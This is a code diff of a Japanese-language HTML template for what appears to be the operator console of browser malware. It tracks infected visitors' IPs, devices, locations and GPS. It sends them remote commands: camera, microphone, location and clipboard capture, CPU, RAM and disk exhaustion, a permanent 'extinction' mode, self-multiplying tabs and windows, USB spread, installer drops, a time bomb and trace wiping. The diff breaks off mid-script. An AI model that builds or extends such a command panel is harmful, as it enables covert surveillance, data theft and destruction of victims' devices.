@@ -1,424 +1,343 @@
-{% extends "base.html" %}
-{% block title %}{{ link.name or code }} — 監視室{% endblock %}
-{% block content %}
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>監視室 — {{ link.name }}</title>
 <style>
-.vw{max-width:1120px;margin:0 auto;color:#dfe8f2;font:13px/1.6 system-ui,-apple-system,"Segoe UI",sans-serif}
-.vw h1{font-size:19px;margin:0 0 6px}
-.vw h2{font-size:13px;margin:0 0 10px;color:#8b9bb0;font-weight:700;letter-spacing:.06em}
-.vw .meta{color:#8b9bb0;font-size:12px;margin-bottom:16px}
-.vw .card{background:#121a25;border:1px solid #1e2a3a;border-radius:10px;padding:14px 16px;margin-bottom:14px}
-.vw .row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
-.vw .sep{height:1px;background:#1e2a3a;margin:12px 0}
+*{box-sizing:border-box}
+html,body{margin:0;background:#0b0e14;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
+body{padding:14px 14px 60px;max-width:1100px;margin:0 auto}
+a{color:#7fb2ff}
+h1{font-size:18px;margin:0 0 4px}
+h2{font-size:14px;margin:0 0 8px;color:#9fb0c8;letter-spacing:.06em}
+.card{background:#121722;border:1px solid #232c3d;border-radius:12px;padding:12px;margin:0 0 12px}
+.row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px}
+button{cursor:pointer;font:inherit;font-size:13px;padding:8px 12px;border-radius:9px;
+  border:1px solid #2c3purple;border:1px solid #2c3a52;background:#18202e;color:#dfe6f2}
+button:hover{background:#1f2a3c}
+button.on{background:#14351f;border-color:#2f7a48;color:#b9ffd0}
+button.warn{background:#3a1a1c;border-color:#8a2f34;color:#ffd3d5}
+button.big{padding:10px 16px;font-size:14px;font-weight:700}
+button:disabled{opacity:.45;cursor:default}
+input,select{font:inherit;font-size:13px;padding:7px 9px;border-radius:8px;
+  border:1px solid #2c3a52;background:#0e131c;color:#e6e9ef;min-width:0}
+input[type=text]{flex:1}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:13px}
+.kv b{color:#8fa2bd;font-weight:600}
+.mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}
+.tag{display:inline-block;font-size:11px;padding:2px 7px;border-radius:999px;
+  background:#1c2432;border:1px solid #2c3a52;color:#9fb0c8}
+.lv{font-size:26px;font-weight:800;color:#7ce23a}
+.live{font-size:26px;font-weight:800;color:#4cd6ff}
+.bar{height:8px;border-radius:99px;background:#1b2230;overflow:hidden;margin:6px 0}
+.bar>i{display:block;height:100%;background:linear-gradient(90deg,#4c8dff,#7ce23a)}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{text-align:left;padding:6px 5px;border-bottom:1px solid #1e2735;vertical-align:top}
+th{color:#8fa2bd;font-weight:600;white-space:nowrap}
+.st{font-weight:700;white-space:nowrap}
+.off{opacity:.5}
+details summary{cursor:pointer;color:#9fb0c8;font-size:13px}
+pre{background:#0a0e15;border:1px solid #1e2735;border-radius:9px;padding:9px;
+  overflow:auto;max-height:320px;font-size:11.5px;margin:8px 0 0}
+.note{font-size:12px;color:#93a3bb;line-height:1.7}
+.warnbar{background:#241318;border:1px solid #7a2f36;color:#ffcdd1;
+  border-radius:10px;padding:9px 11px;font-size:12.5px;margin:0 0 12px}
+</style></head>
+<body>
 
-/* 集計 */
-.vw .stat{display:grid;grid-template-columns:repeat(auto-fit,minmax(112px,1fr));gap:10px;margin-bottom:14px}
-.vw .stat .card{margin:0;text-align:center;padding:12px 8px}
-.vw .stat b{display:block;font-size:25px;line-height:1.15}
-.vw .stat span{color:#8b9bb0;font-size:11px}
-.vw .bar{height:9px;border-radius:99px;background:#1a2432;overflow:hidden;margin-top:9px}
-.vw .bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#3ad1c8,#7ce23a,#ffd21e,#ff8a2b,#ff2d55);transition:width .45s}
+<h1>{{ link.name }} <span class="tag">{{ mode_label }}</span>
+  {% if fixed %}<span class="tag" style="color:#ffd21e">L7 固定</span>{% endif %}
+  {% if not firing %}<span class="tag" style="color:#ff8a2b">停止中</span>{% endif %}
+  {% if freeze %}<span class="tag" style="color:#ff2d55">凍結:{{ freeze }}</span>{% endif %}
+  {% if hard %}<span class="tag" style="color:#ff2d55">絶滅:{{ hard }}</span>{% endif %}
+</h1>
+<div class="row" style="margin:0 0 10px">
+  <span class="tag">code {{ code }}</span>
+  <span class="tag">ver {{ row.ver or '' }}</span>
+  <a class="tag" href="{{ share }}" target="_blank">兵器URL</a>
+  <span class="tag">感染 {{ total }}</span>
+</div>
+{% if caution %}<div class="warnbar">{{ caution }}</div>{% endif %}
 
-/* ボタン */
-.vw button{cursor:pointer;border-radius:8px;border:1px solid #263449;background:#182231;color:#dfe8f2;padding:7px 13px;font-size:12px}
-.vw button:hover{filter:brightness(1.3)}
-.vw button:active{transform:translateY(1px)}
-.vw button.wide{min-width:112px}
-.vw button.danger{background:#3a1620;border-color:#5e2233}
-.vw button.ghost{background:#0e1620}
-.vw button.fixbtn{background:#2a0f22;border-color:#7a1f4a;color:#ff8fc0;font-weight:700}
-.vw button.fixbtn.on{background:#ff0044;border-color:#ff0044;color:#fff}
-
-/* レベル */
-.vw .lvrow{display:flex;flex-wrap:wrap;gap:7px}
-.vw button.lv{font-weight:700;min-width:62px;font-size:13px;padding:8px 0}
-.vw button.lv.on{outline:2px solid #fff;outline-offset:-2px}
-.vw .lvbox{margin-top:11px;border-left:3px solid #3a4a60;background:#0e1620;border-radius:0 8px 8px 0;padding:10px 13px}
-.vw .lvbox b{font-size:14px}
-.vw .lvbox p{margin:4px 0 0;color:#9db0c6;font-size:12px}
-.vw .hint{color:#8b9bb0;font-size:11px}
-
-/* 一覧 */
-.vw table{width:100%;border-collapse:collapse;font-size:12px}
-.vw th,.vw td{padding:6px 7px;border-bottom:1px solid #1e2a3a;text-align:left;vertical-align:top}
-.vw th{color:#8b9bb0;font-weight:600;font-size:11px}
-.vw .badge{display:inline-block;padding:2px 9px;border-radius:99px;font-weight:700;font-size:11px;color:#07101a;white-space:nowrap}
-.vw .ok{color:#7ce23a}.vw .pa{color:#ffd21e}.vw .no{color:#8b9bb0}.vw .bt{color:#4c8dff}
-.vw .verdict{font-weight:700;white-space:nowrap}
-.vw .mono{font-family:ui-monospace,Menlo,Consolas,monospace}
-.vw .out{background:#080d14;border:1px solid #1e2a3a;border-radius:8px;padding:9px;max-height:230px;overflow:auto;white-space:pre-wrap;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11.5px;color:#9fe6c8}
-.vw tr.pick{cursor:pointer}
-.vw tr.sel{background:#16202e}
-.vw select,.vw input{background:#0e1620;border:1px solid #263449;color:#dfe8f2;border-radius:8px;padding:6px 9px;font-size:12px}
-.vw .legend span{margin-right:12px;font-size:11px;color:#8b9bb0;white-space:nowrap}
-.vw .dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:5px;vertical-align:-1px}
-.vw .log{color:#8b9bb0;font-size:11.5px;min-height:16px}
-</style>
-
-<div class="vw" id="vw" data-code="{{ code }}">
-  <h1>🦠 {{ link.name or code }} <span class="mono hint">{{ code }}</span></h1>
-  <div class="meta">
-    モード <b>{{ mode_label }}</b>{% if is_sg %} ／ <b style="color:#ff2d55">特異点</b>{% endif %}
-    ／ 状態 <b id="vw-fire">-</b>
-    ／ 共有URL <a href="{{ share }}" target="_blank" class="mono">{{ share }}</a>
-    {% if caution %}／ <span style="color:#ffd21e">{{ caution }}</span>{% endif %}
+<div class="card">
+  <div class="row" style="justify-content:space-between">
+    <div>
+      <div style="font-size:12px;color:#8fa2bd">レベル（遠隔）</div>
+      <div class="lv" id="lv">L{{ level }}</div>
+      <div class="note" id="lvdesc">{{ level_desc }}</div>
+    </div>
+    <div>
+      <div style="font-size:12px;color:#8fa2bd">生存タブ（推定）</div>
+      <div class="live" id="live">0</div>
+      <div class="note" id="autoinfo">自動増殖 タブ0 / 窓0</div>
+    </div>
+    <div>
+      <div style="font-size:12px;color:#8fa2bd">倒した率</div>
+      <div class="live" id="rate" style="color:#7ce23a">{{ stat.rate }}%</div>
+      <div class="note">{{ stat.defeated }} / {{ stat.total }}（bot {{ stat.bot }} 除外）</div>
+    </div>
   </div>
+  <div class="bar"><i id="ratebar" style="width:{{ stat.rate }}%"></i></div>
 
-  <!-- ===== 集計 ===== -->
-  <div class="stat">
-    <div class="card"><b id="vw-defeated" class="ok">{{ stat.defeated }}</b><span>倒せた（常駐以上）</span></div>
-    <div class="card"><b id="vw-partial" class="pa">{{ stat.partial }}</b><span>部分（着弾〜偵察）</span></div>
-    <div class="card"><b id="vw-idle" class="no">{{ stat.idle }}</b><span>未実行（踏んだだけ）</span></div>
-    <div class="card"><b id="vw-bot" class="bt">{{ stat.bot }}</b><span>ボット除外</span></div>
-    <div class="card"><b id="vw-rate">{{ stat.rate }}%</b><span>制圧率</span></div>
+  <h2 style="margin-top:12px">レベル</h2>
+  <div class="grid" id="lvbtns">
+    {% for l in levels %}
+    <button data-lv="{{ l }}" class="{% if l == level %}on{% endif %}">L{{ l }} {{ LEVEL_LABEL[l] }}</button>
+    {% endfor %}
   </div>
-  <div class="card">
-    <div class="row" style="justify-content:space-between">
-      <span id="vw-line" class="mono hint">実個体 {{ stat.total }} 体</span>
-      <span class="legend" id="vw-legend"></span>
-    </div>
-    <div class="bar"><i id="vw-bar" style="width:{{ stat.rate }}%"></i></div>
-  </div>
-
-  <!-- ===== 操作盤 ===== -->
-  <div class="card">
-    <h2>■ 操作盤</h2>
-
-    <div class="row" style="justify-content:space-between">
-      <span class="hint">強度レベル（L0〜L7）／ L7は固定枠・窓は指数増殖</span>
-      <span class="hint">ヒット <b id="vw-total">{{ total }}</b> ／ 未処理コマンド <b id="vw-pend">0</b></span>
-    </div>
-
-    <div class="lvrow" id="vw-levels" style="margin-top:8px">
-      {% for l in levels %}
-      <button class="lv" data-lv="{{ l }}">{{ l }}</button>
-      {% endfor %}
-    </div>
-
-    <div class="lvbox" id="vw-lvbox">
-      <b id="vw-lvname">{{ level_label }}</b>
-      <p id="vw-lvdesc">{{ level_desc }}</p>
-    </div>
-
-    <div class="sep"></div>
-
-    <div class="row">
-      <button id="vw-fire-btn" class="wide">▶ 1セット出す</button>
-      <button id="vw-stop-btn" class="ghost wide">■ 停止</button>
-      <button id="vw-resume-btn" class="ghost">再開</button>
-      <select id="vw-set">
-        {% for s in sets %}<option value="{{ s }}" {% if s == winset %}selected{% endif %}>{% if s == 0 %}∞ 無限{% else %}{{ s }}枚/セット{% endif %}</option>{% endfor %}
-      </select>
-      <button id="vw-set-btn" class="ghost">窓数を反映</button>
-    </div>
-
-    <div class="row" style="margin-top:9px">
-      <button id="vw-freeze-off" class="ghost">凍結解除</button>
-      <button id="vw-freeze-soft" class="ghost">軟凍結</button>
-      <button id="vw-freeze-hard" class="ghost">硬凍結</button>
-      <button id="vw-boom" class="danger">☢ 終焉（L6即時）</button>
-      <button id="vw-fix" class="fixbtn">🔒 絶滅固定（L7・ロック）</button>
-      <button id="vw-native" class="danger">🖥 インストーラを配る</button>
-      <button id="vw-breed" class="danger">🌐 窓を繁殖（×2）</button>
-      <button id="vw-breed3" class="danger">🌐×3</button>
-      <button id="vw-wipe" class="danger">🧹 痕跡消去</button>
-    </div>
-
-    <div class="row" style="margin-top:9px">
-      <span class="hint">時限爆弾</span>
-      <input id="vw-bomb" placeholder="YYYY-MM-DDTHH:MM" value="{{ bomb }}">
-      <button id="vw-bomb-btn" class="ghost">セット</button>
-      <button id="vw-bomb-clear" class="ghost">解除</button>
-    </div>
-
-    <div class="row" style="margin-top:9px">
-      <span class="hint">絶滅モード（恒久破壊）</span>
-      <select id="vw-hard">
-        <option value="" {% if not hard %}selected{% endif %}>OFF</option>
-        <option value="install" {% if hard == 'install' %}selected{% endif %}>インストールさせたら</option>
-        <option value="always" {% if hard == 'always' %}selected{% endif %}>常時</option>
-      </select>
-      <span class="hint">ONにすると、その端末のCPU/RAM/ディスクを恒久的に埋めます</span>
-    </div>
-
-    <div class="log" id="vw-log" style="margin-top:10px"></div>
-  </div>
-
-  <!-- ===== RATコンソール ===== -->
-  <div class="card">
-    <h2>■ RATコンソール</h2>
-    <div class="row">
-      <span class="hint">対象</span>
-      <select id="vw-sid"><option value="">全個体</option></select>
-      <span class="hint">※下の一覧の行をクリックでも選べます</span>
-    </div>
-    <div class="row" style="margin-top:9px">
-      <button data-cmd="shot">📷 カメラ</button>
-      <button data-cmd="mic">🎙 マイク</button>
-      <button data-cmd="geo">📍 GPS</button>
-      <button data-cmd="clip">📋 クリップボード</button>
-      <button data-cmd="dom">🧬 DOM</button>
-      <button data-cmd="speak">🔊 喋る</button>
-      <button data-cmd="open">🪟 窓を開く</button>
-      <button data-cmd="reload">🔄 再読込</button>
-      <button data-cmd="update">⬆ 更新</button>
-      <button data-cmd="native" class="danger">🖥 インストーラDL</button>
-      <button data-cmd="win" class="danger">🌐 繁殖</button>
-      <!-- RATコンソールのボタン列に追加 -->
-　　　　<button data-cmd="tabs" class="danger">🗂 タブを増やす</button>
-      <button data-cmd="hard" class="danger">☠ 絶滅</button>
-      <button data-cmd="burn" class="danger">🔥 burn</button>
-      <button data-cmd="kill" class="danger">☠ 全停止</button>
-    </div>
-    <div class="row" style="margin-top:9px">
-      <input id="vw-arg" placeholder="引数（喋る言葉 / 開くURL / 繁殖の分岐数）" style="flex:1;min-width:220px">
-      <button id="vw-arg-send" class="ghost">送信</button>
-      <button id="vw-rat-load" class="ghost">取得</button>
-      <button id="vw-cmds-clear" class="ghost">コマンド全消去</button>
-    </div>
-    <div class="out" id="vw-rat" style="margin-top:10px">対象を選んで「取得」。</div>
-  </div>
-
-  <!-- ===== 個体一覧 ===== -->
-  <div class="card">
-    <div class="row" style="justify-content:space-between">
-      <h2 style="margin:0">■ 踏んだ個体 <span class="hint" id="vw-count"></span></h2>
-      <span class="hint">進行度 <b style="color:#7ce23a">常駐</b> 以上で「倒せた」</span>
-    </div>
-    <div style="overflow:auto;margin-top:10px">
-      <table>
-        <thead><tr>
-          <th>#</th><th>時刻</th><th>IP / 場所</th><th>端末 / OS</th>
-          <th>進行度</th><th>判定</th><th>直近の報告</th><th></th>
-        </tr></thead>
-        <tbody id="vw-rows">
-        {% for h in hits %}
-          {% set lv = stages.get(h.id, 0) %}
-          <tr class="pick" data-sid="{{ h.vid or '' }}" data-hit="{{ h.id }}">
-            <td class="mono">{{ h.id }}</td>
-            <td class="mono">{{ (h.ts or '')[:19]|replace('T',' ') }}</td>
-            <td>{{ h.ip }}{% if h.gps_lat is not none %} 📍{% endif %}<br><span class="hint">{{ h.country or '' }} {{ h.city or '' }}</span></td>
-            <td>{{ h.device or '—' }} / {{ h.os or '—' }}<br><span class="hint">{{ h.browser or '' }}</span></td>
-            <td><span class="badge" data-role="stage" style="background:{{ stage_colors.get(lv) }}">{{ stage_labels.get(lv) }}</span></td>
-            <td data-role="verdict">
-              {% if lv >= defeat_at %}<span class="verdict ok">✔ 倒せた</span>
-              {% elif lv >= 1 %}<span class="verdict pa">△ 部分</span>
-              {% else %}<span class="verdict no">✘ 未実行</span>{% endif %}
-            </td>
-            <td class="mono hint" data-role="last">—</td>
-            <td><button class="ghost vw-bot" data-hit="{{ h.id }}">🤖</button></td>
-          </tr>
-        {% endfor %}
-        </tbody>
-      </table>
-    </div>
+  <div class="row" style="margin-top:8px">
+    <button id="fixbtn" class="{% if fixed %}on{% endif %}">L7 固定 {{ 'ON' if fixed else 'OFF' }}</button>
+    <button id="firebtn" class="{% if firing %}on{% endif %}">発火 {{ 'ON' if firing else 'OFF' }}</button>
+    <button id="freezebtn">凍結切替</button>
+    <button id="detonate" class="warn">全開（L6）</button>
   </div>
 </div>
 
+<div class="card">
+  <h2>増殖（特異点）</h2>
+  <div class="note">×2 = 今の生存タブ数を2倍に。×3 = 3倍に。押すたびに倍々で増えます。</div>
+  <div class="grid" style="margin-top:8px">
+    <button class="big" data-breed="2">タブ増殖 ×2</button>
+    <button class="big" data-breed="3">タブ増殖 ×3</button>
+    <button class="big" data-breed="4">タブ増殖 ×4</button>
+    <button data-breed="5">×5</button>
+  </div>
+  <div class="row" style="margin-top:8px">
+    <button data-cmd="autooff">自動増殖 OFF</button>
+    <button data-cmd="autoon">自動増殖 ON</button>
+    <button data-cmd="tabs" data-arg="6">タブ +6</button>
+    <button data-cmd="win" data-arg="3">窓 +3</button>
+    <button data-cmd="tabs" data-arg="20">タブ +20</button>
+  </div>
+  <div class="row" style="margin-top:8px">
+    <span class="note">窓の増殖モード</span>
+    <select id="wmode">
+      <option value="">レベル準拠</option>
+      <option value="off">OFF</option>
+      <option value="chain">チェーン</option>
+      <option value="breed">倍々</option>
+    </select>
+    <span class="note">枝</span><input id="wbranch" type="text" style="width:60px" value="{{ win_branch }}">
+    <span class="note">深さ</span><input id="wdepth" type="text" style="width:60px" value="{{ win_depth }}">
+    <button id="wapply">適用</button>
+    <span class="tag" id="winfo">{{ win_mode or '未設定' }}</span>
+  </div>
+</div>
+
+<div class="card">
+  <h2>効果（遠隔命令）</h2>
+  <div class="grid">
+    <button data-cmd="sound">爆音</button>
+    <button data-cmd="flash">赤点滅</button>
+    <button data-cmd="hop">飛び先へ飛ぶ</button>
+    <button data-cmd="disk">ディスク埋め</button>
+    <button data-cmd="ram">RAM膨張</button>
+    <button data-cmd="cpu">CPU 100%</button>
+    <button data-cmd="gpu">GPU負荷</button>
+    <button data-cmd="opfs">OPFS書き込み</button>
+    <button data-cmd="sw">SW再登録</button>
+    <button data-cmd="rat">RAT起動</button>
+    <button data-cmd="sse">SSE接続</button>
+    <button data-cmd="usb">USB伝染</button>
+    <button data-cmd="notify">通知テスト</button>
+    <button data-cmd="wipe" class="warn">記憶消去</button>
+  </div>
+  <div class="row" style="margin-top:8px">
+    <input id="bombtext" type="text" placeholder="偽ポップアップ文言" value="{{ bomb }}">
+    <button id="bombapply">反映</button>
+    <button id="injbtn" class="{% if inj %}on{% endif %}">注入 {{ 'ON' if inj else 'OFF' }}</button>
+    <button id="hardbtn" class="{% if hard %}on{% endif %}">絶滅 {{ hard or 'OFF' }}</button>
+    <button id="clear" class="warn">命令クリア</button>
+  </div>
+  <div class="note" style="margin-top:6px">命令待ち: <b id="pend">0</b> 件 / 状態 ver <b id="ver">-</b></div>
+</div>
+
+<div class="card">
+  <h2>感染端末 {{ total }} 件</h2>
+  <table>
+    <thead><tr><th>#</th><th>時刻</th><th>IP</th><th>端末</th><th>国</th><th>進行</th><th>GPS</th><th></th></tr></thead>
+    <tbody id="rows">
+    {% for h in hits[:120] %}
+      <tr>
+        <td class="mono">{{ h.id }}</td>
+        <td class="mono">{{ h.ts }}</td>
+        <td class="mono">{{ h.ip }}</td>
+        <td>{{ h.device }} / {{ h.os }}<div class="note">{{ h.browser }}{% if h.inapp %} / {{ h.inapp }}{% endif %}</div></td>
+        <td>{{ h.country or '' }} {{ h.city or '' }}</td>
+        <td class="st" style="color:{{ stage_colors[stages.get(h.id,0)] }}">
+          {{ stage_labels[stages.get(h.id,0)] }}</td>
+        <td>{% if h.gps_lat is not none %}◎{% else %}-{% endif %}</td>
+        <td><button data-bot="{{ h.id }}" class="{% if h.is_bot %}warn{% endif %}">bot</button></td>
+      </tr>
+    {% endfor %}
+    </tbody>
+  </table>
+  <div class="note" style="margin-top:8px">進行「常駐」以上 = 倒せた扱い（{{ defeat_at }}+）。bot を押すと集計から除外。</div>
+</div>
+
+<details class="card"><summary>RAT / 生データ</summary>
+  <pre id="rat">読込中…</pre>
+</details>
+
 <script>
-(function () {
-  const CODE = "{{ code }}", BASE = "{{ base }}", API = "{{ base }}/api/vp/" + "{{ code }}";
-  const LBL = {{ level_labels|tojson }};
-  const DSC = {{ level_descs|tojson }};
-  const SLBL = {{ stage_labels|tojson }}, SCOL = {{ stage_colors|tojson }};
-  const DEFEAT = {{ defeat_at|int }};
-  const COL = ["#5b6b7c","#4c8dff","#3ad1c8","#7ce23a","#ffd21e","#ff8a2b","#ff2d55","#ff0044"];
-  let LV = {{ level|int }}, FIXED = {{ fixed|int }}, ROWS = [], SEL = "";
-  const $ = (id) => document.getElementById(id);
-  const esc = (s) => String(s == null ? "" : s)
-    .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
-  const log = (t) => { $("vw-log").textContent = t; };
-  const lvlColor = (n) => COL[Math.max(0, Math.min(7, n | 0))];
+const CODE = {{ code|tojson }};
+const BASE = {{ base|tojson }};
+const $ = (s) => document.querySelector(s);
 
-  async function post(p, body) {
-    try {
-      const r = await fetch(API + p, {
-        method: "POST", headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(body || {}), credentials: "same-origin"
-      });
-      return await r.json();
-    } catch (e) { log("通信失敗: " + e); return null; }
-  }
-
-  /* ---------- レベル ---------- */
-  const lvBtns = document.querySelectorAll("#vw-levels button.lv");
-  function showLv(n) {
-    n = Math.max(0, Math.min(7, n | 0));
-    $("vw-lvname").textContent = "L" + n + "　" + (LBL[n] || "") + (n === 7 ? " 🔒" : "");
-    $("vw-lvname").style.color = lvlColor(n);
-    $("vw-lvdesc").textContent = DSC[n] || "";
-    $("vw-lvbox").style.borderLeftColor = lvlColor(n);
-  }
-  function paintLv() {
-    lvBtns.forEach(function (b) {
-      const n = parseInt(b.getAttribute("data-lv"), 10) || 0;
-      b.style.color = lvlColor(n);
-      b.style.borderColor = lvlColor(n);
-      b.textContent = (n === 7 && FIXED) ? "🔒7" : String(n);
-      if (n === LV) { b.classList.add("on"); b.style.background = lvlColor(n); b.style.color = (n >= 3 ? "#07101a" : lvlColor(n)); }
-      else { b.classList.remove("on"); b.style.background = "#182231"; }
+async function post(path, body) {
+  try {
+    const r = await fetch(path, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(body || {})
     });
-    $("vw-fix").classList.toggle("on", !!FIXED);
-    $("vw-fix").textContent = FIXED ? "🔓 固定を解除" : "🔒 絶滅固定（L7・ロック）";
-    showLv(LV);
-  }
-  lvBtns.forEach(function (b) {
-    const n = parseInt(b.getAttribute("data-lv"), 10) || 0;
-    b.addEventListener("mouseenter", function () { showLv(n); });
-    b.addEventListener("mouseleave", function () { showLv(LV); });
-    b.addEventListener("click", async function () {
-      if (FIXED && n !== 7) { log("固定枠中。下げるには固定を解除してから。"); }
-      LV = n; paintLv(); log("レベルを L" + n + "（" + (LBL[n] || "") + "）に変更");
-      await post("/level", { level: n }); sync();
-    });
-  });
+    if (!r.ok) return null;
+    const j = await r.json();
+    if (j && j.ok !== undefined) apply(j);
+    return j;
+  } catch (e) { return null; }
+}
 
-  /* ---------- 操作 ---------- */
-  $("vw-fire-btn").onclick   = async () => { await post("/fire");   log("1セット出す"); sync(); };
-  $("vw-stop-btn").onclick   = async () => { await post("/stop");   log("停止"); sync(); };
-  $("vw-resume-btn").onclick = async () => { await post("/resume"); log("再開"); sync(); };
-  $("vw-set-btn").onclick    = async () => { await post("/set", {winset: $("vw-set").value}); log("窓数を変更"); };
-  $("vw-freeze-off").onclick  = async () => { await post("/freeze", {freeze: ""});     log("凍結解除"); sync(); };
-  $("vw-freeze-soft").onclick = async () => { await post("/freeze", {freeze: "soft"}); log("軟凍結"); sync(); };
-  $("vw-freeze-hard").onclick = async () => { await post("/freeze", {freeze: "hard"}); log("硬凍結"); sync(); };
-  $("vw-boom").onclick  = async () => { await post("/detonate"); log("終焉（L6）"); LV = 6; sync(); };
-  $("vw-native").onclick = async () => { await post("/cmd", {sid:"", kind:"native", arg:"bat"}); log("インストーラDLを全個体へ"); sync(); };
-  $("vw-breed").onclick  = async () => { await post("/cmd", {sid:"", kind:"win", arg:"2"}); log("窓を×2で繁殖"); sync(); };
-  $("vw-breed3").onclick = async () => { await post("/cmd", {sid:"", kind:"win", arg:"3"}); log("窓を×3で繁殖"); sync(); };
-  $("vw-fix").onclick   = async () => {
-    FIXED = FIXED ? 0 : 1;
-    await post("/fix", {fixed: FIXED});
-    log(FIXED ? "絶滅固定をロック（L7・遠隔から下げられない）" : "固定を解除");
-    LV = FIXED ? 7 : LV; sync();
-  };
-  $("vw-wipe").onclick  = async () => { await post("/wipe");     log("痕跡消去を指示"); };
-  $("vw-bomb-btn").onclick   = async () => { await post("/bomb", {bomb: $("vw-bomb").value}); log("時限爆弾をセット"); };
-  $("vw-bomb-clear").onclick = async () => { $("vw-bomb").value = ""; await post("/bomb", {bomb: ""}); log("時限爆弾を解除"); };
-  $("vw-cmds-clear").onclick = async () => { await post("/cmds/clear"); log("コマンドを全消去"); sync(); };
-  $("vw-hard").addEventListener("change", async function () {
-    await post("/hard", { hard: this.value });
-    log("絶滅モード: " + (this.value || "OFF"));
-    sync();
-  });
-
-  async function sendCmd(kind, arg) {
-    await post("/cmd", { sid: SEL, kind: kind, arg: arg || "" });
-    log(kind + " を " + (SEL || "全個体") + " に送信"); sync();
-  }
-  document.querySelectorAll("[data-cmd]").forEach(function (b) {
-    b.addEventListener("click", function () {
-      const k = b.getAttribute("data-cmd");
-      /* sendCmd の引数対象に tabs を追加 */
-　　　　const a = (k === "speak" || k === "open" || k === "native" || k === "win" || k === "tabs") ? $("vw-arg").value : "";
-      sendCmd(k, a);
-    });
-  });
-  $("vw-arg-send").onclick = () => sendCmd("speak", $("vw-arg").value);
-  $("vw-sid").addEventListener("change", function () { SEL = this.value; loadRat(); });
-  $("vw-rat-load").onclick = loadRat;
-  async function loadRat() {
-    if (!SEL) { $("vw-rat").textContent = "対象を選んでください。"; return; }
-    try {
-      const j = await fetch(API + "/rat?sid=" + encodeURIComponent(SEL), {credentials:"same-origin"}).then(r => r.json());
-      $("vw-rat").textContent = JSON.stringify(j, null, 1);
-    } catch (e) { $("vw-rat").textContent = "取得失敗: " + e; }
-  }
-
-  /* ---------- 一覧 ---------- */
-  function paintRows() {
-    const tb = $("vw-rows");
-    tb.innerHTML = ROWS.map(function (h) {
-      const lv = h.lv | 0;
-      const verdict = h.bot ? '<span class="verdict bt">🤖 ボット</span>'
-        : lv >= DEFEAT ? '<span class="verdict ok">✔ 倒せた</span>'
-        : lv >= 1 ? '<span class="verdict pa">△ 部分</span>'
-        : '<span class="verdict no">✘ 未実行</span>';
-      const place = esc([h.country, h.city].filter(Boolean).join(" ")) || "—";
-      return '<tr class="pick' + (h.vid && h.vid === SEL ? ' sel' : '') + '" data-sid="' + esc(h.vid) + '" data-hit="' + h.id + '">'
-        + '<td class="mono">' + h.id + '</td>'
-        + '<td class="mono">' + esc((h.ts || "").slice(0,19).replace("T"," ")) + '</td>'
-        + '<td>' + esc(h.ip) + (h.gps ? ' <span title="GPSあり">📍</span>' : '') + '<br><span class="hint">' + place + '</span></td>'
-        + '<td>' + esc(h.device || "—") + ' / ' + esc(h.os || "—") + '<br><span class="hint">' + esc(h.browser || "") + '</span></td>'
-        + '<td><span class="badge" style="background:' + (SCOL[lv] || lvlColor(lv)) + '">' + esc(SLBL[lv] || "未実行") + '</span></td>'
-        + '<td>' + verdict + '</td>'
-        + '<td class="mono hint">' + esc(h.last || "—") + '</td>'
-        + '<td><button class="ghost vw-bot" data-hit="' + h.id + '">' + (h.bot ? "解除" : "🤖") + '</button></td>'
-        + '</tr>';
-    }).join("");
-    tb.querySelectorAll("tr").forEach(function (tr) {
-      tr.addEventListener("click", function () {
-        SEL = tr.getAttribute("data-sid") || "";
-        $("vw-sid").value = SEL;
-        tb.querySelectorAll("tr").forEach(t => t.classList.remove("sel"));
-        tr.classList.add("sel");
-        loadRat();
-      });
-    });
-    tb.querySelectorAll(".vw-bot").forEach(function (b) {
-      b.addEventListener("click", async function (e) {
-        e.stopPropagation();
-        await fetch(API + "/hit/" + b.getAttribute("data-hit") + "/bot",
-                    {method: "POST", credentials: "same-origin"});
-        sync();
-      });
+function apply(s) {
+  if (!s) return;
+  if (s.level !== undefined) {
+    $("#lv").textContent = "L" + s.level;
+    document.querySelectorAll("#lvbtns button").forEach(b => {
+      b.classList.toggle("on", String(b.dataset.lv) === String(s.level));
     });
   }
-
-  function paintStat(st) {
-    $("vw-defeated").textContent = st.defeated;
-    $("vw-partial").textContent  = st.partial;
-    $("vw-idle").textContent     = st.idle;
-    $("vw-bot").textContent      = st.bot;
-    $("vw-rate").textContent     = st.rate + "%";
-    $("vw-bar").style.width      = st.rate + "%";
-    const parts = [];
-    for (let i = 6; i >= 0; i--) if (st.stages[i]) parts.push((SLBL[i] || i) + " " + st.stages[i]);
-    $("vw-line").textContent = "実個体 " + st.total + " 体 / " + (parts.join(" ・ ") || "なし")
-      + (st.uanone ? " / UA無し " + st.uanone : "");
+  if (s.fixed !== undefined) {
+    const b = $("#fixbtn");
+    b.classList.toggle("on", !!s.fixed);
+    b.textContent = "L7 固定 " + (s.fixed ? "ON" : "OFF");
   }
+  if (s.firing !== undefined) {
+    const b = $("#firebtn");
+    b.classList.toggle("on", !!s.firing);
+    b.textContent = "発火 " + (s.firing ? "ON" : "OFF");
+  }
+  if (s.live !== undefined) $("#live").textContent = s.live;
+  if (s.auto_tab !== undefined) {
+    $("#autoinfo").textContent =
+      "自動増殖 タブ" + (s.auto_tab || 0) + " / 窓" + (s.auto_win || 0) +
+      (s.auto_on ? "" : "（OFF）");
+  }
+  if (s.pending !== undefined) $("#pend").textContent = s.pending;
+  if (s.ver !== undefined) $("#ver").textContent = s.ver;
+  if (s.win_mode !== undefined) $("#winfo").textContent = s.win_mode || "未設定";
